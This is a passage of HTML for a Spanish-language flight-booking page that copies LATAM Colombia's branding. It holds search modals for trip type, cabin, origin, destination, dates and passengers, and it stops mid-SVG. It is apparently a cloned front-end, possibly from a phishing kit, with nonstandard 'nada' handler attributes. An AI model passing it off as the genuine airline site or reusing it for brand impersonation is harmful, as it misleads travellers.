<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cotiza Vuelos, Paquetes, Hoteles y Carros | LTM Colombia</title>
    <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">

    <!-- CSS -->
    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/utils.css">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/hotel-datepicker.css">

    <!-- JS -->
    <script src="./js2/functions.js"></script>
</head>

<body>

    <!-- TRAVEL TYPE-->
    <div class="modal" id="travel-type">
        <div class="d-flex justify-content-end p-1" nada="hideModal('travel-type')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>
        <div class="pr-4 pl-4 ">
            <h4 class="fw-light fs-25 tc-ocean mt-1">Tipo de Viaje</h4>
            <div class="d-flex justify-space-between">
                <span class="fs-5 tc-gray-smoke">Ida y Vuelta</span>
                <div class="radio-container">
                    <input type="radio" name="travel-opt" id="go-back">
                    <div class="custom-radio ct-radio"></div>
                </div>
            </div>
            <div class="d-flex justify-space-between mt-3">
                <span class="fs-5 tc-gray-smoke">Solo Ida</span>
                <div class="radio-container">
                    <input type="radio" name="travel-opt" id="just-go">
                    <div class="custom-radio ct-radio"></div>
                </div>
            </div>
            <button class="btn-success mt-5" nada="btnSuccessHandler('btn-travel-type')">Confirmar</button>
        </div>
    </div>



    <!-- SEAT TYPE-->
    <div class="modal" id="seat-type">
        <div class="d-flex justify-content-end p-1" nada="hideModal('seat-type')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>
        <div class="pr-4 pl-4 ">
            <h4 class="fw-light fs-25 tc-ocean mt-1">Tipo de Cabina</h4>
            <div class="d-flex justify-space-between">
                <span class="fs-5 tc-gray-smoke">Economy</span>
                <div class="radio-container">
                    <input type="radio" name="seat-type" id="eco">
                    <div class="custom-radio ct-radio"></div>
                </div>
            </div>
            <div class="d-flex justify-space-between mt-3">
                <span class="fs-5 tc-gray-smoke">Premium Economy</span>
                <div class="radio-container">
                    <input type="radio" name="seat-type" id="premium-eco">
                    <div class="custom-radio ct-radio"></div>
                </div>
            </div>
            <div class="d-flex justify-space-between mt-3">
                <span class="fs-5 tc-gray-smoke">Premium Business</span>
                <div class="radio-container">
                    <input type="radio" name="seat-type" id="premium-business">
                    <div class="custom-radio ct-radio"></div>
                </div>
            </div>
            <button class="btn-success mt-5" nada="btnSuccessHandler('btn-seat-type')">Confirmar</button>
        </div>
    </div>



    <!-- SELECT ORIGIN -->
    <div class="modal" id="select-origin">
        <div class="d-flex justify-content-end p-1" nada="hideModal('select-origin')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>

        <div class="pr-4 pl-4 modal-search">
            <h4 class="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Origen</h4>
            <div class="input-container">
                <input oninput="searchAirports(this.value, 'origin')" type="text" id="origin" required="">
                <label for="origin">Origen</label>
            </div>
            <div class="mt-4" id="search-results-origin">



            </div>
        </div>

        <div class="modal-bottom pr-4 pl-4">
            <button class="btn-success mt-5" nada="hideModal('select-origin')">Confirmar</button>
        </div>
    </div>

    <!-- SELECT DESTINATION -->
    <div class="modal" id="select-destination">
        <div class="d-flex justify-content-end p-1" nada="hideModal('select-destination')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>

        <div class="pr-4 pl-4 modal-search">
            <h4 class="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Destino</h4>
            <div class="input-container">
                <input oninput="searchAirports(this.value, 'destination')" type="text" id="destination" required="">
                <label for="origin">Destino</label>
            </div>
            <div class="mt-4" id="search-results-destination">



            </div>
        </div>

        <div class="modal-bottom pr-4 pl-4">
            <button class="btn-success mt-5" nada="hideModal('select-destination')">Confirmar</button>
        </div>
    </div>



    <!-- SELECT DATES -->
    <div class="modal" id="select-dates">
        <div class="d-flex justify-content-end p-1" nada="hideModal('select-dates')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>

        <div class="pr-4 pl-4 modal-search">
            <h4 class="fw-light fs-25 tc-ocean mt-1 mb-0">¿Cuándo viajas?</h4>
            <div class="d-flex justify-content-center align-items-center">
                <input type="hidden" id="datepicker">
            </div>
        </div>

        <div class="modal-bottom pr-4 pl-4">
            <button class="btn-success mt-5" nada="hideModal('select-dates')">Confirmar</button>
        </div>
    </div>



    <!-- SELECT PASSENGERS -->
    <div class="modal" id="select-passengers">
        <div class="d-flex justify-content-end p-1" nada="hideModal('select-passengers')">
            <svg style="width: 25px; color:#5c5c5c;" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32">
                <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path>
            </svg>
        </div>
        <div class="pr-4 pl-4 pl-4 modal-search">
            <h4 class="fw-light fs-25 tc-ocean mt-1">Agregar Pasajeros</h4>

            <!-- ADULTS -->
            <div class="border-bottom pb-1">
                <div class="d-flex justify-space-between tc-gray-smoke">
                    <div class="d-flex justify-content-center align-items-center">
                        <svg style="margin-right: 18px; margin-left: 15px;" viewBox="0 0 16 21" width="16" height="21" color="#B30F3B">
                            <path style="fill: currentColor;" d="M8.63396 7.93475C8.33208 8.1047 8.01006 8.24279 7.66792 8.34901C7.34591 8.43399 7.01384 8.47648 6.6717 8.47648C5.58491 8.47648 4.63899 8.06221 3.83396 7.23369C3.04906 6.38391 2.6566 5.38543 2.6566 4.23824C2.6566 3.09105 3.04906 2.10319 3.83396 1.27466C4.63899 0.424886 5.58491 0 6.6717 0C7.41635 0 8.10063 0.201821 8.72453 0.605463C9.34843 1.0091 9.83145 1.52959 10.1736 2.16692C10.3346 2.48558 10.4553 2.82549 10.5358 3.18665C10.6365 3.52656 10.6868 3.87709 10.6868 4.23824C10.6868 5.02428 10.4956 5.74659 10.1132 6.40516C9.73082 7.06373 9.23773 7.5736 8.63396 7.93475ZM9.75094 4.23824C9.75094 3.34598 9.44906 2.58118 8.84528 1.94385C8.24151 1.30653 7.51698 0.987861 6.6717 0.987861C5.82641 0.987861 5.10189 1.30653 4.49811 1.94385C3.89434 2.58118 3.59245 3.34598 3.59245 4.23824C3.59245 5.1305 3.89434 5.8953 4.49811 6.53263C5.10189 7.16995 5.82641 7.48862 6.6717 7.48862C7.51698 7.48862 8.24151 7.16995 8.84528 6.53263C9.44906 5.8953 9.75094 5.1305 9.75094 4.23824ZM0.935849 20.4901C0.935849 20.6388 0.885535 20.7663 0.784906 20.8725C0.704403 20.9575 0.593711 21 0.452831 21C0.332076 21 0.221384 20.9575 0.120755 20.8725C0.0402516 20.7663 0 20.6388 0 20.4901V13.7026C0 13.5964 0.0201258 13.5008 0.0603775 13.4158C0.120755 13.3308 0.201258 13.2671 0.301887 13.2246L13.3736 8.25341C14.1182 7.95599 14.7421 7.98786 15.2453 8.34901C15.7484 8.68892 16 9.24127 16 10.0061V20.4583C16 20.5857 15.9497 20.7026 15.8491 20.8088C15.7686 20.8938 15.6579 20.9363 15.517 20.9363C15.3761 20.9363 15.2654 20.8938 15.1849 20.8088C15.1044 20.7026 15.0641 20.5857 15.0641 20.4583V10.0061C15.0641 9.60243 14.9434 9.31563 14.7019 9.14567C14.4805 8.97572 14.1484 8.98634 13.7057 9.17754L0.935849 14.0531V20.4901Z"></path>
                        </svg>
                        <div>
                            <p class="fs-4 m-0 mb-1">Adultos</p>
                            <p class="fs-5 m-0">12 o más años</p>
                        </div>
                    </div>

                    <div class="d-flex align-items-center">
                        <svg nada="passengersHandler('adults', '-')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                            <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                            <path style="fill: currentColor;" d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                        </svg>
                        <span id="adults-number" class="pl-3 pr-3 fs-3">1</span>
                        <svg nada="passengersHandler('adults', '+')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                            <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                            <path style="fill: currentColor;" d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                        </svg>
                    </div>
                </div>

                <div class="d-flex p-3 lh-1 mt-4 justify-space-between align-items-start bg-info rounded-white">
                    <img src="./assets/media/info_icon.png" width="23px">
                    <div>
                        <p class="fs-5 tc-ocean m-0 ml-3 mb-4">Revisa las condiciones para viajes con jóvenes entre 12 y 16 años solos o acompañados.</p>
                        <a class="fs-4 fw-bold ml-3 tc-ocean mt-4" href="">Jóvenes de 12 a 16 años</a>
                    </div>
                </div>
            </div>


            <!-- CHILDREN -->
            <div class="d-flex justify-space-between tc-gray-smoke pt-1 pb-1 border-bottom">
                <div class="d-flex justify-content-center align-items-center">
                    <svg style="margin-right: 18px; margin-left: 15px;" viewBox="0 0 16 16" width="16" height="16" color="#B30F3B">
                        <path style="fill: currentColor;" d="M0.717566 15.629C0.717566 15.737 0.684316 15.8262 0.613035 15.892C0.541754 15.9624 0.451437 15.9953 0.346891 15.9953C0.25185 15.9953 0.17106 15.9624 0.104532 15.892C0.0332505 15.8215 0 15.737 0 15.629V6.8135C0 6.6773 0.0237139 6.5646 0.0712346 6.48006C0.118755 6.39552 0.190124 6.34383 0.280414 6.32974L5.35559 4.60143C5.74526 4.47932 6.05412 4.46519 6.28697 4.55442C6.51982 4.64835 6.69094 4.84562 6.80023 5.1509L8.07851 8.92695L9.36155 6.18882C9.3758 6.14185 9.39963 6.10428 9.4329 6.0714C9.46141 6.04322 9.50883 6.01979 9.57061 6.001L14.2277 4.3431C14.6173 4.2069 14.95 4.2539 15.2304 4.49342C15.5108 4.73295 15.5963 5.04291 15.487 5.42333L14.0898 9.72534C14.0566 9.81927 13.9996 9.885 13.9141 9.93196C13.8285 9.97893 13.7334 9.98365 13.6241 9.95547C13.5481 9.94138 13.4816 9.8898 13.4246 9.80526C13.3723 9.72072 13.358 9.62674 13.3913 9.51872L14.7885 5.21671C14.817 5.12278 14.7979 5.05694 14.7171 5.00998C14.6411 4.96301 14.5555 4.96301 14.4605 5.00998L9.94128 6.62098L8.38259 10.0494C8.36834 10.1104 8.34462 10.1574 8.31136 10.1856C8.27809 10.2185 8.23531 10.2373 8.17353 10.2561H8.14975L8.12608 10.2796H8.10229H8.00728C7.91223 10.2796 7.83621 10.2466 7.77443 10.1762C7.71265 10.1057 7.6793 10.0353 7.6793 9.95547L6.1206 5.39983C6.05883 5.29181 5.99234 5.22609 5.92105 5.20261C5.84977 5.17913 5.74049 5.19785 5.58368 5.25891L0.717566 6.94031V15.629ZM4.95637 2.30475C4.95637 2.87304 4.75678 3.35211 4.36236 3.74193C3.96794 4.13174 3.48798 4.329 2.93199 4.329C2.35699 4.329 1.87236 4.13174 1.47794 3.74193C1.08352 3.35211 0.883935 2.87304 0.883935 2.30475C0.883935 1.75056 1.08352 1.2809 1.47794 0.891082C1.87236 0.501267 2.35699 0.304011 2.93199 0.304011C3.49273 0.304011 3.96794 0.501267 4.36236 0.891082C4.75678 1.2809 4.95637 1.75056 4.95637 2.30475ZM4.23405 2.30475C4.23405 1.95251 4.10583 1.64726 3.84922 1.39365C3.59261 1.14003 3.28839 1.0132 2.92723 1.0132C2.55657 1.0132 2.23819 1.14003 1.98633 1.39365C1.73447 1.64726 1.6015 1.94781 1.6015 2.30475C1.6015 2.67108 1.72972 2.98586 1.98633 3.23478C2.24294 3.48839 2.55657 3.61511 2.92723 3.61511C3.28364 3.61511 3.59261 3.48839 3.84922 3.23478C4.10583 2.98116 4.23405 2.67108 4.23405 2.30475ZM5.70248 15.9953H5.60746C5.53143 15.9953 5.46017 15.9717 5.3984 15.9248C5.33662 15.8778 5.2986 15.8262 5.2796 15.7652L3.64955 11.5054L3.02236 15.6947C3.00811 15.7886 2.9558 15.8637 2.87027 15.9248C2.78473 15.9858 2.69441 16.0094 2.60412 15.9953C2.50908 15.9624 2.43305 15.9107 2.37128 15.8356C2.3095 15.7604 2.28578 15.6759 2.30004 15.5819L2.99858 10.9324C3.01284 10.8385 3.05561 10.768 3.1269 10.7117C3.19818 10.66 3.26944 10.6319 3.35023 10.6319H3.83971C3.91574 10.6319 3.98699 10.6553 4.04877 10.7023C4.11055 10.7492 4.14856 10.8009 4.16757 10.862L5.95911 15.5115C5.99237 15.6055 5.98761 15.6947 5.94959 15.7887C5.91158 15.8826 5.84509 15.9436 5.75005 15.9718L5.72626 15.9953H5.70248ZM11.2197 15.5586C11.2339 15.6666 11.2149 15.7604 11.1626 15.8356C11.1103 15.9107 11.0343 15.9671 10.9393 15.9953H10.868C10.7587 15.9953 10.6732 15.9717 10.6114 15.9248C10.5496 15.8778 10.5116 15.8027 10.4974 15.6947L10.0079 13.2103H7.91214C7.8171 13.2103 7.73631 13.1773 7.66978 13.1068C7.60325 13.0364 7.56525 12.9566 7.56525 12.8673C7.56525 12.7593 7.5985 12.6701 7.66978 12.6044C7.74106 12.5386 7.82185 12.5011 7.91214 12.5011H10.312C10.388 12.5011 10.464 12.5292 10.5353 12.5809C10.6066 12.6326 10.6494 12.7077 10.6636 12.8016L11.2197 15.5586ZM8.63447 1.63788C8.62021 1.71302 8.58219 1.77414 8.51566 1.82111C8.45389 1.86807 8.37786 1.89151 8.28282 1.89151H8.21158C8.11654 1.87742 8.04527 1.82572 7.98825 1.74119C7.93598 1.65665 7.92169 1.5768 7.95495 1.50166C8.06425 1.05548 8.2306 0.707948 8.45394 0.454333C8.67729 0.200719 8.9529 0.0504474 9.2808 0.00348174C9.49939 -0.0106079 9.70375 0.0175485 9.89859 0.0973901C10.0934 0.172535 10.274 0.289944 10.445 0.444931C10.6018 0.33691 10.773 0.257064 10.9583 0.205402C11.1436 0.15374 11.3384 0.125597 11.5428 0.125597C11.7614 0.125597 11.9752 0.158459 12.1842 0.228908C12.3933 0.299356 12.5835 0.393338 12.7546 0.515448C12.8781 0.346372 13.0539 0.214832 13.2772 0.125597C13.5006 0.0316657 13.7334 -0.0059068 13.9663 0.00818289C14.2942 0.0551485 14.5698 0.20542 14.7931 0.459035C15.0165 0.712649 15.1828 1.06019 15.2921 1.50636C15.3254 1.5815 15.3112 1.66605 15.2589 1.74589C15.2067 1.83043 15.1305 1.88212 15.0355 1.89621H14.9642C14.8692 1.89621 14.7979 1.87277 14.7409 1.82581C14.6886 1.77884 14.6506 1.71772 14.6364 1.64258C14.5746 1.35139 14.4748 1.12127 14.3465 0.952196C14.2134 0.78312 14.0614 0.693844 13.8903 0.675058C13.7667 0.660968 13.6384 0.68452 13.5053 0.745575C13.3723 0.806631 13.2821 0.881771 13.2393 0.975702V0.999208H13.2155C13.3391 1.16828 13.434 1.34671 13.4958 1.53927C13.5576 1.73183 13.591 1.9338 13.591 2.14984C13.591 2.70404 13.3914 3.1737 12.9969 3.56351C12.6025 3.95333 12.1178 4.15058 11.5428 4.15058C10.982 4.15058 10.5068 3.95333 10.1124 3.56351C9.71799 3.1737 9.5184 2.69934 9.5184 2.14984C9.5184 1.9338 9.55165 1.72241 9.62293 1.51576C9.69421 1.30911 9.79872 1.10714 9.93653 0.905185C9.76545 0.736109 9.58492 0.665674 9.39009 0.68446C9.19525 0.707943 9.03843 0.801925 8.91488 0.971001C8.8531 1.04615 8.79604 1.14471 8.75327 1.25743C8.70575 1.37014 8.66773 1.49698 8.63447 1.63788ZM12.8734 2.14044C12.8734 1.77411 12.7451 1.45945 12.4884 1.21053C12.2318 0.956916 11.9182 0.830081 11.5475 0.830081C11.1911 0.830081 10.8823 0.956916 10.6257 1.21053C10.3691 1.46414 10.2407 1.77411 10.2407 2.14044C10.2407 2.49268 10.3691 2.79793 10.6257 3.05155C10.8823 3.30516 11.1864 3.432 11.5475 3.432C11.9182 3.432 12.2366 3.30516 12.4884 3.05155C12.7451 2.79793 12.8734 2.49738 12.8734 2.14044ZM13.5957 15.676C13.5815 15.7699 13.5387 15.845 13.4674 15.9061C13.3961 15.9671 13.3248 16 13.2441 16H13.1965C13.0872 15.9859 13.0016 15.9389 12.9399 15.8638C12.8781 15.7886 12.8544 15.7041 12.8686 15.6101L13.2155 12.8251C13.2298 12.75 13.2726 12.6796 13.3438 12.6185C13.4151 12.5574 13.4959 12.5245 13.5862 12.5245H15.1449L14.7029 10.9841C14.6696 10.8761 14.6791 10.7821 14.7266 10.6976C14.7742 10.613 14.8454 10.5566 14.9357 10.5237C15.045 10.5096 15.1401 10.5238 15.2256 10.5707C15.3112 10.6177 15.3681 10.6834 15.4014 10.7774L15.9859 12.7781C16.0144 12.9143 16.0002 13.027 15.9384 13.1115C15.8767 13.1961 15.7768 13.2384 15.6342 13.2384H13.8855L13.5957 15.676Z"></path>
                    </svg>
                    <div>
                        <p class="fs-4 m-0 mb-1">Niños</p>
                        <p class="fs-5 m-0">De 2 a 11 años</p>
                    </div>
                </div>

                <div class="d-flex align-items-center">
                    <svg nada="passengersHandler('children', '-')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                        <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                        <path style="fill: currentColor;" d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                    </svg>
                    <span id="children-number" class="pl-3 pr-3 fs-3">0</span>
                    <svg nada="passengersHandler('children', '+')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                        <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                        <path style="fill: currentColor;" d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                    </svg>
                </div>
            </div>


            <!-- BABIES -->
            <div class="d-flex justify-space-between tc-gray-smoke pt-1 pb-1 border-bottom">
                <div class="d-flex justify-content-center align-items-center">
                    <svg style="margin-right: 18px; margin-left: 15px;" viewBox="0 0 12 15" width="16" height="15" color="#B30F3B">
                        <path style="fill: currentColor;" d="M6.01584 0.794401C5.58398 0.794401 5.22166 0.938261 4.91776 1.2315C4.61386 1.52474 4.46426 1.8873 4.46426 2.31383C4.46426 2.74568 4.61386 3.10292 4.91776 3.39615C5.21633 3.68939 5.58398 3.83338 6.01584 3.83338C6.4317 3.83338 6.78879 3.68939 7.08736 3.39615C7.38593 3.10292 7.54086 2.74035 7.54086 2.31383C7.54086 1.88197 7.39126 1.52474 7.08736 1.2315C6.78346 0.943592 6.42637 0.794401 6.01584 0.794401ZM6.01584 4.64379C5.36005 4.64379 4.80551 4.41452 4.35232 3.96133C3.8938 3.50815 3.66973 2.95896 3.66973 2.3245C3.66973 1.68471 3.89914 1.14098 4.35232 0.682459C4.80551 0.223942 5.36539 0 6.01584 0C6.65563 0 7.19949 0.229274 7.65801 0.682459C8.11653 1.14098 8.3406 1.68471 8.3406 2.3245C8.3406 2.95896 8.11119 3.50815 7.65801 3.96133C7.19949 4.41452 6.6503 4.64379 6.01584 4.64379ZM3.04598 8.23194V8.62114C3.04598 9.61814 3.31256 10.4072 3.84572 10.983C4.37887 11.5588 5.10414 11.8468 6.01584 11.8468C6.92754 11.8468 7.64733 11.5535 8.16982 10.967C8.69232 10.3805 8.95915 9.59681 8.95915 8.6158V8.2266H3.04598V8.23194ZM2.7367 14.7898C2.6514 14.9284 2.5395 14.9977 2.40088 14.9977C2.36889 14.9977 2.33186 14.9924 2.29987 14.987C2.26255 14.9764 2.23045 14.9658 2.19313 14.9498C2.09183 14.8805 2.02766 14.7951 2.00101 14.6938C1.97435 14.5925 1.98518 14.4859 2.03849 14.3846L3.50989 11.8041C2.6675 11.047 2.24624 9.98603 2.24624 8.62647V7.85342C2.24624 7.73079 2.28394 7.63479 2.36391 7.55482C2.44388 7.47485 2.52906 7.43754 2.63569 7.43754H9.37463C9.47593 7.43754 9.56645 7.47485 9.64642 7.55482C9.7264 7.63479 9.76409 7.73079 9.76409 7.85342V8.62647C9.76409 9.95404 9.34806 11.0043 8.527 11.7774L10.0255 14.3846C10.0788 14.4912 10.0891 14.5925 10.0624 14.6938C10.0358 14.7951 9.97173 14.8805 9.8651 14.9498C9.83311 14.9658 9.80116 14.9764 9.7745 14.987C9.74785 14.9977 9.7159 14.9977 9.68391 14.9977C9.52929 14.9977 9.40683 14.9284 9.32153 14.7898L7.87669 12.236C7.3222 12.5292 6.70361 12.6732 6.01584 12.6732C5.32806 12.6732 4.70414 12.5292 4.15499 12.236L2.7367 14.7898ZM9.70526 6.32319C9.63594 6.44049 9.52404 6.50451 9.36943 6.50451H2.63049C2.47587 6.50451 2.36397 6.44582 2.29466 6.32319L0.305728 3.17227C0.236417 3.08696 0.215029 2.98563 0.241687 2.87367C0.268345 2.76171 0.321952 2.68175 0.407257 2.62844C0.631184 2.48982 0.822892 2.52711 0.972177 2.72971L2.85958 5.69944H9.13461L11.022 2.72971C11.1766 2.52177 11.3634 2.48982 11.5927 2.62844C11.678 2.68175 11.7369 2.76171 11.7582 2.87367C11.7849 2.98563 11.7635 3.08696 11.6942 3.17227L9.70526 6.32319Z"></path>
                    </svg>
                    <div>
                        <p class="fs-4 m-0 mb-1">Bebés</p>
                        <p class="fs-5 m-0">Menos de 2 años</p>
                    </div>
                </div>

                <div class="d-flex align-items-center">
                    <svg nada="passengersHandler('babies', '-')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                        <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                        <path style="fill: currentColor;" d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                    </svg>
                    <span id="babies-number" class="pl-3 pr-3 fs-3">0</span>
                    <svg nada="passengersHandler('babies', '+')" viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                        <path style="fill: currentColor;" d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                        <path style="fill: currentColor;" d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                    </svg>
                </div>
            </div>

        </div>
        <div class="modal-bottom pr-4 pl-4">
            <button class="btn-success mt-5" nada="hideModal('select-passengers')">Confirmar</button>
        </div>
    </div>





    <nav class="navbar">
        <div>
            <img class="navbar--logo" src="./assets/logos/LATAM_navbar.png">
        </div>

        <div class="d-flex justify-content-center align-items-center">
            <button class="btn-session">
                Iniciar sesión
            </button>
            <img class="navbar--hamburger" src="./assets/media/hamburger_a.png">
        </div>
    </nav>

    <div class="index-background"></div>

    <main>
        <div class="card card-rounded mt-3">
            <div class="scrollable-nav pb-3">
                <button class="scroll-button left-button"><img style="width: 17px; height: 17px;" src="./assets/media/left_gray_arrow.png"></button>
                <div class="nav-items">
                    <a href="#" class="nav-item ni-selected">Vuelos</a>
                    <a href="" class="nav-item">Paquetes</a>
                    <a href="" class="nav-item">Hoteles</a>
                    <a href="" class="nav-item">Carros</a>
                    <a href="" class="nav-item">Seguros</a>
                    <a href="" class="nav-item">Upgrade</a>
                </div>
                <button class="scroll-button right-button"><img style="width: 17px; height: 17px;" src="./assets/media/right_red_arrow.png"></button>
            </div>

            <div class="pl-3 pr-3 pb-3">
                <h2 class=" pt-2 main-title">¿A dónde quieres ir?</h2>
                <div class="d-flex justify-space-between mt-3 pl-3 pr-3">
                    <div nada="showModal('travel-type')"><span class="mr-1 fs-5 tc-gray-smoke fw-bolder" id="label-travel-type">Ida y Vuelta</span><img width="15px" src="./assets/media/red_down_arrow.png"></div>
                    <div nada="showModal('seat-type')"><span class="mr-1 fs-5 tc-gray-smoke fw-bolder" id="label-seat-type">Economy</span><img width="15px" src="./assets/media/red_down_arrow.png"></div>
                </div>
                <div class="mt-3 d-flex align-items-center justify-space-between">
                    <img class="mr-3" src="./assets/media/takeoff_icon.png" width="25px">
                    <div class="index-input" id="label-origin" nada="showModal('select-origin')">
                        <p class="placeholder">Origen</p>
                        <!-- <p><b>Yopal</b> EYP - Colombia</p> -->
                    </div>
                </div>
                <div id="cont-destination" class="pb-5 mt-3 d-flex align-items-center justify-space-between">
                    <img style="margin-right: 24px;" src="./assets/media/mappoint_icon.png" width="17px">
                    <div class="index-input" id="label-destination" nada="showModal('select-destination')">
                        <p class="placeholder">Destino</p>
                        <!-- <p><b>Yopal</b> EYP - Colombia</p> -->
                    </div>
                </div>

                <div id="rest-options" class="d-none">
                    <div class="mt-3 d-flex align-items-center justify-space-between">
                        <svg style="margin-right: 24px;" viewBox="0 0 17 21" color="#2500c3" width="22" height="22">
                            <path style="fill: currentColor;" d="M10.1951 4.54332C10.0751 4.54332 9.96786 4.50175 9.87314 4.41278C9.77841 4.32974 9.73407 4.21709 9.73407 4.08067V3.04865H7.65639C7.51115 3.04865 7.39744 3.00715 7.30271 2.92412C7.2143 2.83515 7.16395 2.72835 7.16395 2.59193C7.16395 2.47924 7.20799 2.3784 7.30271 2.28944C7.39744 2.20047 7.51115 2.15897 7.65639 2.15897H9.73407V0.432966C9.73407 0.320273 9.77841 0.219437 9.87314 0.130469C9.96786 0.0474323 10.0688 0 10.1951 0C10.3403 0 10.454 0.041501 10.5487 0.130469C10.6435 0.219437 10.6875 0.320273 10.6875 0.432966V4.08067C10.6875 4.21709 10.6435 4.32974 10.5487 4.41278C10.4603 4.50175 10.3403 4.54332 10.1951 4.54332ZM5.30089 15.8007C5.19985 15.8007 5.12417 15.783 5.08628 15.7414C4.90314 15.6643 4.80845 15.5398 4.80845 15.3678V11.8624C4.80845 11.7319 4.85248 11.6192 4.94721 11.5302C5.03562 11.4413 5.15564 11.3998 5.30089 11.3998C5.44614 11.3998 5.55984 11.4413 5.65457 11.5302C5.7493 11.6192 5.79333 11.726 5.79333 11.8624V14.4781L10.9339 10.9194C11.0349 10.8423 11.1549 10.8126 11.2875 10.8304C11.4202 10.8482 11.5277 10.9075 11.6098 11.0024C11.6919 11.0973 11.7169 11.21 11.6853 11.3345C11.6537 11.4591 11.5906 11.5599 11.4895 11.637L5.58519 15.7177C5.54099 15.7355 5.49664 15.7533 5.44612 15.777C5.38929 15.7948 5.3451 15.8007 5.30089 15.8007ZM14.2619 19.1044C14.6282 19.1044 14.9124 19.0154 15.1145 18.8434C15.2976 18.6714 15.3923 18.4045 15.3923 18.0368V7.72838H0.987658V19.1044H14.2619ZM4.4483 4.54332C4.30305 4.54332 4.18934 4.50175 4.09462 4.41278C4.0062 4.32974 3.95586 4.21709 3.95586 4.08067V3.04865H2.14953C1.78326 3.04865 1.49933 3.14947 1.29724 